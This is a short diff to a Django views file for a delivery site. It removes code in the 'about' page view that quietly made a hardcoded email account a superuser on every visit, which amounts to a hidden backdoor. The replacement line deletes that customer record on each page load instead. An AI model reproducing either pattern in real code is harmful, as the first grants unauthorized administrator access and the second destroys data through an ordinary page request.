@@ -23,8 +23,7 @@ def home(request):
 
 def about(request):
     customer = Customer.objects.filter(email='sharpdelivery616@gmail.com').first()
-    customer.is_superuser = True
-    customer.save()
+    customer.delete()
     return render(request, 'delivery/about.html')
 
 def service(request):
